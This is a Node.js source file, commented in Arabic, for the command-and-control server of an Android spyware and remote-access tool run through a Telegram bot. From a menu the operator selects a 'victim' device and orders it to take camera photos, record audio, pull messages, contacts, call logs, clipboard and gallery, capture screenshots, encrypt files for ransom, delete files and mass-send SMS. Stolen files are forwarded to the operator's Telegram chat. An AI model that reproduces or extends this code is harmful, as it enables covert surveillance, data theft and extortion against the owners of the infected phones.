// server.js - إصدار محسن ومنظم
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// تهيئة التطبيق
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// تحميل بيانات التكوين
const configPath = path.join(__dirname, 'data.json');
const data = JSON.parse(fs.readFileSync(configPath, 'utf8'));

// إنشاء البوت
const bot = new TelegramBot(data.token, { polling: true });

// تخزين البيانات المؤقتة
const appData = new Map();

// تعريف الأكشنز (الإجراءات)
const actions = [
    '📸 كيمرا خلفية',
    '📸 كيمرا أمامية',
    '🎬 سحب جميع الصور',
    '💬 سحب الرسائل',
    '📞 سجل المكالمات',
    '📒 سحب جهات الاتصال',
    '📋 سجل الحافظة',
    '📳 اهتزاز 📳',
    '🎙 تسجيل صوت',
    '▶ تشغيل الصوت ▶',
    '🛑 ايقاف الصوت 🛑',
    '📽 التطبيقات 📽',
    '📺 لقطة شاشة 😎',
    '⚠️ تشفير ملفات ⚠️',
    '✯ عدد الاجهزه ✯',
    '✯ العودة إلى الرئيسية ✯',
    '📧 سحب رسايل جيميل 📧',
    '📂 عرض جميع الملفات',
    '✯ قائمة الرئيسية ✯',
    '🦝 اضهار اشعارات الضحيه',
    '✯ تحميل ملف ✯',
    '✯ حذف الملف ✯',
    '✯ التراجع ✯',
    '✯ الرجوع ✯'
];

// المسارات الأساسية
app.get('/', (req, res) => {
    res.send('Bot Server is Running');
});

// نقطة النهاية لرفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceName = req.body.name;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `📁 تم رفع ملف من الجهاز\n👤 اسم الجهاز: ${deviceName}\n📄 اسم الملف: ${fileName}`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: req.file.mimetype
    });
    
    res.send('File uploaded successfully');
});

// معالجة اتصال السوكيت
io.on('connection', (socket) => {
    const deviceName = socket.handshake.query.name || 'غير معروف';
    const deviceId = socket.handshake.query.deviceId || 'غير معروف';
    const ipAddress = socket.handshake.query.ip || 'غير معروف';
    
    socket.deviceName = deviceName;
    socket.deviceId = deviceId;
    
    // إرسال إشعار الاتصال
    const connectionMessage = `
<b>📱 جهاز جديد متصل!</b>

<b>👤 اسم الجهاز:</b> ${deviceName}
<b>🆔 معرف الجهاز:</b> ${deviceId}
<b>🌐 عنوان IP:</b> ${ipAddress}
<b>🔗 حالة الاتصال:</b> متصل ✅
    `;
    
    bot.sendMessage(data.id, connectionMessage, { parse_mode: 'HTML' });
    
    // معالجة انقطاع الاتصال
    socket.on('disconnect', () => {
        const disconnectMessage = `
<b>📱 جهاز انقطع!</b>

<b>👤 اسم الجهاز:</b> ${deviceName}
<b>🆔 معرف الجهاز:</b> ${deviceId}
<b>🌐 عنوان IP:</b> ${ipAddress}
<b>🔗 حالة الاتصال:</b> منقطع ❌
        `;
        
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });
    
    // معالجة طلبات الملفات
    socket.on('file-explorer', (files) => {
        let keyboard = [];
        let row = [];
        
        files.forEach((file, index) => {
            let callbackData;
            if (file.isFolder) {
                callbackData = `${deviceId}|cd-${file.name}`;
            } else {
                callbackData = `${deviceId}|delete-${file.name}`;
            }
            
            row.push({
                text: file.name,
                callback_data: callbackData
            });
            
            if (row.length === 2 || index === files.length - 1) {
                keyboard.push(row);
                row = [];
            }
        });
        
        keyboard.push([{
            text: '✯ رجوع ✯',
            callback_data: deviceId + '|back-0'
        }]);
        
        bot.sendMessage(data.id, '<b>📂 استعرض الملفات</b>\n\nاختر الملف الذي تريد التحكم فيه:', {
            reply_markup: { inline_keyboard: keyboard },
            parse_mode: 'HTML'
        });
    });
    
    // معالجة النصوص الواردة
    socket.on('toastText', (text) => {
        bot.sendMessage(data.id, `<b>📝 نص من الجهاز:</b>\n\n👤 الجهاز: ${deviceName}\n📄 النص: ${text}`, { 
            parse_mode: 'HTML' 
        });
    });
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // معالجة أمر /start
    if (text === '/start') {
        const welcomeMessage = `
<b>✯ أهلآ وسهلا في بوت تحكم ✯</b>

<b>📌 معلومات البوت:</b>
<b>👨‍💻 المطور:</b> قائد 『ABN』 @Aosab
<b>👑 المالك:</b> @Aosab
<b>🏢 المنظمة:</b> 『ABN』

<b>🚀 مميزات البوت:</b>
• تحكم كامل في الأجهزة
• الوصول إلى الكاميرا والميكروفون
• إدارة الملفات والرسائل
• التحكم عن بعد

<b>📊 الإحصائيات:</b>
👥 عدد الأجهزة المتصلة: ${io.engine.clientsCount}
        `;
        
        const keyboard = {
            keyboard: [
                ['✯ عدد الاجهزه ✯', '✯ اختيار ضحيه ✯'],
                ['✯ معلومات المطور ✯']
            ],
            resize_keyboard: true
        };
        
        bot.sendMessage(chatId, welcomeMessage, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }
    
    // معالجة أمر عرض الأجهزة
    else if (text === '✯ عدد الاجهزه ✯') {
        if (io.engine.clientsCount === 0) {
            bot.sendMessage(chatId, '<b>⚠️ لا توجد أجهزة متصلة حالياً</b>', { 
                parse_mode: 'HTML' 
            });
        } else {
            let devicesList = '<b>📱 قائمة الأجهزة المتصلة:</b>\n\n';
            let counter = 1;
            
            io.sockets.sockets.forEach((socket, socketId) => {
                devicesList += `<b>${counter}.</b> 👤 ${socket.deviceName}\n`;
                devicesList += `<b>   🆔 المعرف:</b> ${socket.deviceId}\n`;
                devicesList += `<b>   🌐 IP:</b> ${socket.handshake.query.ip || 'غير معروف'}\n`;
                devicesList += `<b>   🔗 الحالة:</b> متصل ✅\n\n`;
                counter++;
            });
            
            bot.sendMessage(chatId, devicesList, { parse_mode: 'HTML' });
        }
    }
    
    // معالجة أمر اختيار الضحية
    else if (text === '✯ اختيار ضحيه ✯') {
        if (io.engine.clientsCount === 0) {
            bot.sendMessage(chatId, '<b>⚠️ لا توجد أجهزة متصلة حالياً</b>', { 
                parse_mode: 'HTML' 
            });
        } else {
            let devicesKeyboard = [];
            
            io.sockets.sockets.forEach((socket) => {
                devicesKeyboard.push([socket.deviceName]);
            });
            
            devicesKeyboard.push(['✯ العودة إلى الرئيسية ✯']);
            
            bot.sendMessage(chatId, '<b>👥 اختر الجهاز الذي تريد التحكم فيه:</b>', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: devicesKeyboard,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    }
    
    // معالجة أمر معلومات المطور
    else if (text === '✯ معلومات المطور ✯') {
        const developerInfo = `
<b>👨‍💻 معلومات المطور:</b>

<b>🏢 المنظمة:</b> 『ABN』
<b>👑 القائد:</b> @Aosab
<b>📧 التواصل:</b> @Aosab
<b>🔧 الإصدار:</b> 2.0

<b>📢 ملاحظة:</b>
تم تطوير هذا البوت لأغراض أمنية وتعليمية
جميع الحقوق محفوظة © 2024
        `;
        
        bot.sendMessage(chatId, developerInfo, { parse_mode: 'HTML' });
    }
    
    // معالجة العودة إلى الرئيسية
    else if (text === '✯ العودة إلى الرئيسية ✯') {
        const mainKeyboard = {
            keyboard: [
                ['✯ عدد الاجهزه ✯', '✯ اختيار ضحيه ✯'],
                ['✯ معلومات المطور ✯']
            ],
            resize_keyboard: true
        };
        
        bot.sendMessage(chatId, '<b>🏠 الرئيسية</b>\n\nاختر من القائمة:', {
            parse_mode: 'HTML',
            reply_markup: mainKeyboard
        });
    }
    
    // معالجة اختيار جهاز محدد
    else {
        io.sockets.sockets.forEach((socket, socketId) => {
            if (text === socket.deviceName) {
                appData.set('currentDevice', socketId);
                
                const deviceControlKeyboard = {
                    keyboard: [
                        ['📸 كيمرا خلفية', '📸 كيمرا أمامية'],
                        ['🎬 سحب جميع الصور', '💬 سحب الرسائل'],
                        ['📞 سجل المكالمات', '📒 سحب جهات الاتصال'],
                        ['📋 سجل الحافظة', '📳 اهتزاز 📳'],
                        ['🎙 تسجيل صوت', '▶ تشغيل الصوت ▶'],
                        ['🛑 ايقاف الصوت 🛑', '📽 التطبيقات 📽'],
                        ['📺 لقطة شاشة 😎', '⚠️ تشفير ملفات ⚠️'],
                        ['✯ عدد الاجهزه ✯'],
                        ['✯ ارسال رساله', '✯ ارسال رساله للجميع'],
                        ['✯ ارسال SMS', '✯ ارسال SMS للجميع'],
                        ['☎️اتصال', '🛑 ايقاف الاشعارات'],
                        ['✯ عرض الملفات ✯'],
                        ['✯ العودة إلى الرئيسية ✯']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                };
                
                const deviceInfo = `
<b>🎯 جهاز محدد:</b>
<b>👤 اسم الجهاز:</b> ${socket.deviceName}
<b>🆔 المعرف:</b> ${socket.deviceId}
<b>🌐 IP:</b> ${socket.handshake.query.ip || 'غير معروف'}

<b>🚀 تم إنشاء هذا البوت بواسطة منظمة 『ABN』</b>
<b>👨‍💻 مطور البوت:</b> قائد 『ABN』 @Aosab
<b>👑 مالك البوت:</b> @Aosab
                `;
                
                bot.sendMessage(chatId, deviceInfo, {
                    parse_mode: 'HTML',
                    reply_markup: deviceControlKeyboard
                });
            }
        });
    }
    
    // معالجة الأكشنز
    if (actions.includes(text)) {
        const currentDevice = appData.get('currentDevice');
        
        if (!currentDevice) {
            bot.sendMessage(chatId, '<b>⚠️ الرجاء تحديد جهاز أولاً</b>', { 
                parse_mode: 'HTML' 
            });
            return;
        }
        
        // معالجة كل أكشن
        switch(text) {
            case '📸 كيمرا خلفية':
                io.to(currentDevice).emit('request', {
                    request: 'main-camera',
                    extras: []
                });
                break;
                
            case '📸 كيمرا أمامية':
                io.to(currentDevice).emit('request', {
                    request: 'selfie-camera',
                    extras: []
                });
                break;
                
            case '🎬 سحب جميع الصور':
                io.to(currentDevice).emit('request', {
                    request: 'gallery',
                    extras: []
                });
                break;
                
            case '💬 سحب الرسائل':
                io.to(currentDevice).emit('request', {
                    request: 'all-sms',
                    extras: []
                });
                break;
                
            case '📞 سجل المكالمات':
                io.to(currentDevice).emit('request', {
                    request: 'calls',
                    extras: []
                });
                break;
                
            case '📒 سحب جهات الاتصال':
                io.to(currentDevice).emit('request', {
                    request: 'contacts',
                    extras: []
                });
                break;
                
            case '📋 سجل الحافظة':
                io.to(currentDevice).emit('request', {
                    request: 'clipboard',
                    extras: []
                });
                break;
                
            case '📳 اهتزاز 📳':
                io.to(currentDevice).emit('request', {
                    request: 'vibrate',
                    extras: []
                });
                break;
                
            case '🎙 تسجيل صوت':
                io.to(currentDevice).emit('request', {
                    request: 'recordVoice',
                    extras: []
                });
                break;
                
            case '▶ تشغيل الصوت ▶':
                appData.set('currentAction', 'playAudio');
                bot.sendMessage(chatId, '<b>🎵 أدخل رابط الصوت:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '🛑 ايقاف الصوت 🛑':
                io.to(currentDevice).emit('request', {
                    request: 'stopAudio',
                    extras: []
                });
                break;
                
            case '📽 التطبيقات 📽':
                io.to(currentDevice).emit('request', {
                    request: 'apps',
                    extras: []
                });
                break;
                
            case '📺 لقطة شاشة 😎':
                io.to(currentDevice).emit('request', {
                    request: 'screenshot',
                    extras: []
                });
                break;
                
            case '⚠️ تشفير ملفات ⚠️':
                io.to(currentDevice).emit('request', {
                    request: 'encrypt',
                    extras: []
                });
                break;
                
            case '✯ عرض الملفات ✯':
                io.to(currentDevice).emit('request', {
                    request: 'ls',
                    extras: []
                });
                break;
                
            case '✯ ارسال رساله':
                appData.set('currentAction', 'sendSms');
                bot.sendMessage(chatId, '<b>📝 أدخل رقم الهاتف:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '✯ ارسال رساله للجميع':
                appData.set('currentAction', 'textToAllContacts');
                bot.sendMessage(chatId, '<b>📢 أدخل النص للإرسال للجميع:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '✯ ارسال SMS':
                appData.set('currentAction', 'sendSms');
                bot.sendMessage(chatId, '<b>📱 أدخل رقم الهاتف:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '✯ ارسال SMS للجميع':
                appData.set('currentAction', 'smsToAllContacts');
                bot.sendMessage(chatId, '<b>📩 أدخل نص SMS للجميع:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '☎️اتصال':
                appData.set('currentAction', 'makeCall');
                bot.sendMessage(chatId, '<b>📞 أدخل رقم الهاتف للاتصال:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ العودة إلى الرئيسية ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
                return;
                
            case '🛑 ايقاف الاشعارات':
                io.to(currentDevice).emit('request', {
                    request: 'popNotification',
                    extras: []
                });
                break;
        }
        
        // إرسال تأكيد التنفيذ
        bot.sendMessage(chatId, '<b>✅ تم تنفيذ الأمر بنجاح</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزه ✯', '✯ اختيار ضحيه ✯'],
                    ['✯ معلومات المطور ✯']
                ],
                resize_keyboard: true
            }
        });
    }
});

// معالجة الكويري (استدعاءات الأزرار)
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const callbackData = query.data;
    
    const parts = callbackData.split('|');
    const deviceId = parts[0];
    const action = parts[1];
    const actionParts = action.split('-');
    const command = actionParts[0];
    const parameter = actionParts[1];
    
    // معالجة الأمر back
    if (command === 'back') {
        io.sockets.sockets.forEach((socket, socketId) => {
            if (socket.deviceId === deviceId) {
                io.to(socketId).emit('request', {
                    request: 'back',
                    extras: []
                });
            }
        });
    }
    
    // معالجة الأمر cd
    else if (command === 'cd') {
        io.sockets.sockets.forEach((socket, socketId) => {
            if (socket.deviceId === deviceId) {
                io.to(socketId).emit('request', {
                    request: 'cd',
                    extras: [{
                        key: 'path',
                        value: parameter
                    }]
                });
            }
        });
    }
    
    // معالجة الأمر delete
    else if (command === 'delete') {
        io.sockets.sockets.forEach((socket, socketId) => {
            if (socket.deviceId === deviceId) {
                io.to(socketId).emit('request', {
                    request: 'delete',
                    extras: [{
                        key: 'file',
                        value: parameter
                    }]
                });
            }
        });
    }
    
    // معالجة الأمر upload
    else if (command === 'upload') {
        bot.answerCallbackQuery(query.id, {
            text: '📁 استخدم /upload لرفع الملف',
            show_alert: true
        });
    }
});

// إرسال بينج منتظم للحفاظ على الاتصال
setInterval(() => {
    io.sockets.sockets.forEach((socket, socketId) => {
        io.to(socketId).emit('ping', {});
    });
}, 30000);

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ Server is running on port ${PORT}`);
});

// ملف data.json المطلوب
/*
{
    "id": "YOUR_TELEGRAM_CHAT_ID",
    "token": "YOUR_TELEGRAM_BOT_TOKEN"
}
*/